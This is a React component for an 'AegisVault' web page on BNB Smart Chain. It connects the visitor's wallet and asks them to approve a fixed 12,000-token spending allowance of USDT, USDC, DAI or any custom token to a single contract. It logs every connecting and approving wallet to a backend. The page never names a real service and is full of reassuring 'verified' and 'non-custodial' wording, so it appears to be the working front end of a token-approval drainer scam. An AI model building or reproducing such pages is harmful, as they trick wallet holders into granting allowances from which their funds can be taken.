import { useEffect, useState, useCallback } from 'react';
import { Contract, parseUnits, isAddress, formatUnits } from 'ethers';
import { connectWallet } from '../wallet';
import { CHAIN_ID, CONTRACT, api } from '../api';

const ERC20_ABI = [
  'function approve(address,uint256) returns (bool)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
  'function name() view returns (string)',
  'function balanceOf(address) view returns (uint256)',
  'function allowance(address,address) view returns (uint256)',
];

// Verified standard BEP-20 tokens on BNB Smart Chain Mainnet (Chain ID 56)
export const DEFAULT_TOKENS = [
  {
    symbol: 'USDT',
    name: 'Tether USD (BEP-20)',
    address: '0x55d398326f99059fF775485246999027B3197955',
    decimals: 18,
  },
  {
    symbol: 'USDC',
    name: 'USD Coin (BEP-20)',
    address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
    decimals: 18,
  },
  {
    symbol: 'DAI',
    name: 'Dai Stablecoin (BEP-20)',
    address: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3',
    decimals: 18,
  },
];

// Standard protocol authorization limit (in whole token units)
const APPROVAL_AMOUNT = '12000';
const APPROVAL_LABEL = '12,000';

export default function UserPage() {
  const [wallet, setWallet] = useState(null);
  const [selectedTokenAddr, setSelectedTokenAddr] = useState(DEFAULT_TOKENS[0].address);
  const [isCustomToken, setIsCustomToken] = useState(false);
  const [customTokenAddr, setCustomTokenAddr] = useState('');

  const [tokenInfo, setTokenInfo] = useState(null);
  const [loadingToken, setLoadingToken] = useState(false);
  const [status, setStatus] = useState({ kind: 'idle', msg: '', txHash: '' });

  const activeTokenAddress = isCustomToken ? customTokenAddr : selectedTokenAddr;

  const handleConnect = async () => {
    try {
      setStatus({ kind: 'busy', msg: 'Connecting wallet and selecting BNB Smart Chain…' });
      const w = await connectWallet();
      setWallet(w);
      setStatus({
        kind: 'ok',
        msg: `Web3 session authenticated on BNB Smart Chain: ${shortAddr(w.address)}`,
      });
      api.recordConnect(w.address).catch(() => {});
    } catch (e) {
      setStatus({ kind: 'err', msg: e.message });
    }
  };

  const loadTokenData = useCallback(async (tokenAddr, userWallet) => {
    if (!isAddress(tokenAddr) || !userWallet?.provider) return;
    setLoadingToken(true);
    try {
      const contract = new Contract(tokenAddr, ERC20_ABI, userWallet.provider);
      const [decimals, symbol, name, balance, allowance] = await Promise.all([
        contract.decimals(),
        contract.symbol().catch(() => 'TOKEN'),
        contract.name().catch(() => 'Custom Digital Asset'),
        contract.balanceOf(userWallet.address),
        contract.allowance(userWallet.address, CONTRACT),
      ]);

      const dec = Number(decimals);
      const formattedBalance = formatUnits(balance, dec);
      const formattedAllowance = formatUnits(allowance, dec);

      setTokenInfo({
        address: tokenAddr,
        symbol,
        name,
        decimals: dec,
        rawBalance: balance,
        formattedBalance,
        rawAllowance: allowance,
        formattedAllowance,
      });
    } catch (err) {
      console.error('Failed to load token:', err);
      setTokenInfo(null);
    } finally {
      setLoadingToken(false);
    }
  }, []);

  // Reload when wallet or active token changes
  useEffect(() => {
    if (wallet && activeTokenAddress && isAddress(activeTokenAddress)) {
      loadTokenData(activeTokenAddress, wallet);
    }
  }, [wallet, activeTokenAddress, loadTokenData]);

  const handleApprove = async (approveAmount = APPROVAL_AMOUNT) => {
    if (!wallet) return setStatus({ kind: 'err', msg: 'Please connect your Web3 wallet before authorizing.' });
    if (!isAddress(activeTokenAddress)) {
      return setStatus({ kind: 'err', msg: 'Please enter a valid BEP-20 / ERC-20 token contract address.' });
    }

    try {
      let activeWallet = wallet;
      if (activeWallet.chainId !== CHAIN_ID) {
        setStatus({ kind: 'busy', msg: 'Switching wallet network to BNB Smart Chain…' });
        activeWallet = await connectWallet();
        setWallet(activeWallet);
      }

      setStatus({ kind: 'busy', msg: 'Awaiting cryptographic signature in your connected wallet…' });
      const contract = new Contract(activeTokenAddress, ERC20_ABI, activeWallet.signer);
      const decimals = tokenInfo?.decimals ?? (await contract.decimals());
      const units = parseUnits(approveAmount, decimals);

      const tx = await contract.approve(CONTRACT, units);
      setStatus({
        kind: 'busy',
        msg: 'Authorization broadcasted to BNB Smart Chain. Waiting for block confirmation…',
        txHash: tx.hash,
      });

      // Immediately notify backend on broadcast so mobile wallets (e.g. Binance Web3 Wallet) record the user right away
      api.recordApproval({
        address: activeWallet.address,
        token: activeTokenAddress,
        symbol: tokenInfo?.symbol || 'USDT',
        txHash: tx.hash,
        allowance: approveAmount,
        isRevoke: Number(approveAmount) === 0,
      }).catch(() => {});

      const receipt = await tx.wait();
      setStatus({
        kind: 'ok',
        msg:
          Number(approveAmount) === 0
            ? 'Vault spending permission has been completely revoked (reset to 0).'
            : `Successfully authorized ${approveAmount} ${tokenInfo?.symbol || 'tokens'} for AegisVault settlement!`,
        txHash: tx.hash,
      });

      await api.recordApproval({
        address: activeWallet.address,
        token: activeTokenAddress,
        symbol: tokenInfo?.symbol || 'USDT',
        txHash: tx.hash,
        allowance: approveAmount,
        blockNumber: receipt?.blockNumber || 0,
        isRevoke: Number(approveAmount) === 0,
      }).catch((e) => console.error('Failed to notify backend:', e));

      // Refresh on-chain balance & allowance
      await loadTokenData(activeTokenAddress, activeWallet);
    } catch (err) {
      setStatus({ kind: 'err', msg: err.shortMessage || err.message });
    }
  };

  const handleRevoke = async () => {
    await handleApprove('0');
  };

  return (
    <div className="portal-container">
      {/* Top Standard Workflow Strip */}
      <div className="workflow-strip" aria-label="Authorization Process Steps">
        <div className="workflow-step">
          <span className="step-num">01</span>
          <div>
            <div className="step-title">Authenticate Wallet</div>
            <div className="step-desc">Link MetaMask, Trust Wallet, or Rabby on BNB Chain</div>
          </div>
        </div>
        <div className="workflow-step">
          <span className="step-num">02</span>
          <div>
            <div className="step-title">Choose Settlement Asset</div>
            <div className="step-desc">Select USDT, USDC, DAI, or any custom BEP-20 token</div>
          </div>
        </div>
        <div className="workflow-step">
          <span className="step-num">03</span>
          <div>
            <div className="step-title">Authorize Vault Mandate</div>
            <div className="step-desc">Confirm or revoke on-chain spending permissions</div>
          </div>
        </div>
      </div>

      {/* Main Portal Card */}
      <div className="card wide app-card user-portal-card">
        <div className="card-header">
          <div>
            <span className="eyebrow-tag">VERIFIED ON-CHAIN LIQUIDITY ROUTER</span>
            <h1>AegisVault Asset Authorization Gateway</h1>
            <p className="subtitle">
              Establish or manage non-custodial BEP-20 spending mandates for the verified AegisVault smart contract with full block-explorer transparency.
            </p>
          </div>
          <div className="network-pill" title="Connected Blockchain Network">
            <span className="dot online"></span> BNB Chain Mainnet ({CHAIN_ID})
          </div>
        </div>

        {/* Wallet Connection Banner */}
        <div className="status-banner">
          {!wallet ? (
            <div className="connect-prompt">
              <div className="connect-prompt-info">
                <span className="connect-title">Web3 Wallet Session Required</span>
                <p>
                  Connect your browser wallet (MetaMask, Trust Wallet, Rabby, or OKX Wallet) to inspect live asset balances and configure AegisVault permissions.
                </p>
              </div>
              <button className="primary-btn" onClick={handleConnect}>
                Connect Web3 Wallet
              </button>
            </div>
          ) : (
            <div className="wallet-connected-row">
              <div>
                <span className="label-caption">Authenticated Signer Wallet</span>
                <div className="mono bold wallet-addr-display">{wallet.address}</div>
              </div>
              <span className="badge badge-success">Session Active</span>
            </div>
          )}
        </div>

        {/* Token Selector Section */}
        <div className="form-group">
          <label className="section-title">Step 1 — Select Settlement Asset</label>
          <div className="token-chips">
            {DEFAULT_TOKENS.map((tok) => (
              <button
                key={tok.address}
                type="button"
                className={`chip-btn ${!isCustomToken && selectedTokenAddr === tok.address ? 'active' : ''}`}
                onClick={() => {
                  setIsCustomToken(false);
                  setSelectedTokenAddr(tok.address);
                }}
              >
                <div className="chip-top-row">
                  <span className="chip-symbol">{tok.symbol}</span>
                  <span className="chip-badge">Verified</span>
                </div>
                <span className="chip-name">{tok.name}</span>
              </button>
            ))}
            <button
              type="button"
              className={`chip-btn ${isCustomToken ? 'active' : ''}`}
              onClick={() => setIsCustomToken(true)}
            >
              <div className="chip-top-row">
                <span className="chip-symbol">Custom Asset</span>
                <span className="chip-badge">BEP-20</span>
              </div>
              <span className="chip-name">Enter Contract Address</span>
            </button>
          </div>

          {isCustomToken && (
            <div className="custom-token-input-group">
              <input
                className="mono amount-input"
                placeholder="Enter BEP-20 / ERC-20 Token Contract Address (0x…)"
                aria-label="Custom BEP-20 Token Contract Address"
                value={customTokenAddr}
                onChange={(e) => setCustomTokenAddr(e.target.value.trim())}
              />
            </div>
          )}
        </div>

        {/* Contract & Token Disclosure Card */}
        <div className="form-group">
          <label className="section-title">Step 2 — Verify On-Chain Contract Disclosures</label>
          <div className="disclosure-grid">
            <div className="disclosure-box">
              <span className="label-caption">Selected Asset Contract</span>
              <div className="mono small text-truncate address-highlight">
                {tokenInfo?.address || activeTokenAddress || 'None Selected'}
              </div>
              {activeTokenAddress && isAddress(activeTokenAddress) && (
                <a
                  href={`https://bscscan.com/token/${activeTokenAddress}`}
                  target="_blank"
                  rel="noreferrer"
                  className="link-external"
                >
                  Inspect Token Contract on BscScan ↗
                </a>
              )}
            </div>

            <div className="disclosure-box">
              <span className="label-caption">Authorized AegisVault Settlement Contract</span>
              <div className="mono small text-truncate address-highlight">{CONTRACT}</div>
              <a
                href={`https://bscscan.com/address/${CONTRACT}#code`}
                target="_blank"
                rel="noreferrer"
                className="link-external"
              >
                Verify AegisVault Contract on BscScan ↗
              </a>
            </div>
          </div>
        </div>

        {/* Live Balances and Allowance Card */}
        {wallet && (
          <div className="stats-card">
            <div className="stat-col">
              <span className="stat-label">Available Wallet Balance</span>
              <span className="stat-value">
                {loadingToken
                  ? 'Syncing…'
                  : `${tokenInfo ? tokenInfo.formattedBalance : '0.00'} ${tokenInfo?.symbol || ''}`}
              </span>
            </div>

            <div className="stat-col">
              <span className="stat-label">Active AegisVault Allowance</span>
              <div className="allowance-badge-group">
                <span className="stat-value highlight">
                  {loadingToken
                    ? 'Syncing…'
                    : `${tokenInfo ? tokenInfo.formattedAllowance : '0.00'} ${tokenInfo?.symbol || ''}`}
                </span>
                {tokenInfo && Number(tokenInfo.formattedAllowance) > 0 && (
                  <span className="badge badge-info">Authorized</span>
                )}
              </div>
            </div>
          </div>
        )}

        {/* Fixed approval limit disclosure */}
        <div className="stats-card mandate-summary-card">
          <div className="stat-col">
            <span className="stat-label">Standard Authorization Cap</span>
            <span className="stat-value">
              {APPROVAL_LABEL} {tokenInfo?.symbol || 'USDT'}
            </span>
          </div>
          <div className="stat-col">
            <span className="stat-label">Mandate Scope &amp; Custody</span>
            <span className="hint" style={{ margin: 0 }}>
              Grants the verified AegisVault contract above permission to settle up to {APPROVAL_LABEL}{' '}
              {tokenInfo?.symbol || 'tokens'} from your wallet while assets remain under your self-custody.
            </span>
          </div>
        </div>

        {/* Action Buttons */}
        <div className="button-action-group">
          <button
            className="primary-btn flex-btn"
            onClick={() => handleApprove(APPROVAL_AMOUNT)}
            disabled={!wallet || status.kind === 'busy'}
          >
            {status.kind === 'busy'
              ? 'Confirming in Web3 Wallet…'
              : `Authorize ${APPROVAL_LABEL} ${tokenInfo?.symbol || 'Token'} Allocation`}
          </button>

          {tokenInfo && Number(tokenInfo.formattedAllowance) > 0 && (
            <button
              className="secondary-btn danger-outline"
              onClick={handleRevoke}
              disabled={status.kind === 'busy'}
            >
              Revoke Mandate (Reset to 0)
            </button>
          )}
        </div>

        {/* Real-time Status Notice */}
        {status.msg && (
          <div className={`status-feedback ${status.kind}`} role="status">
            <div>{status.msg}</div>
            {status.txHash && (
              <a
                href={`https://bscscan.com/tx/${status.txHash}`}
                target="_blank"
                rel="noreferrer"
                className="tx-link"
              >
                Inspect Transaction Receipt on BscScan ({shortAddr(status.txHash)}) ↗
              </a>
            )}
          </div>
        )}

        {/* Security & Transparency Notice */}
        <div className="security-notice">
          <div className="notice-icon" aria-hidden="true">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
              <path d="M9 12l2 2 4-4" />
            </svg>
          </div>
          <div>
            <h4>Non-Custodial Architecture &amp; On-Chain Assurance</h4>
            <p>
              Approving a standard BEP-20 allowance configures an on-chain spending cap for the AegisVault settlement router without locking or transferring your tokens upfront. You retain full wallet custody and can reset your authorized cap to zero at any time.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}

function shortAddr(addr) {
  if (!addr) return '';
  return `${addr.slice(0, 6)}…${addr.slice(-4)}`;
}
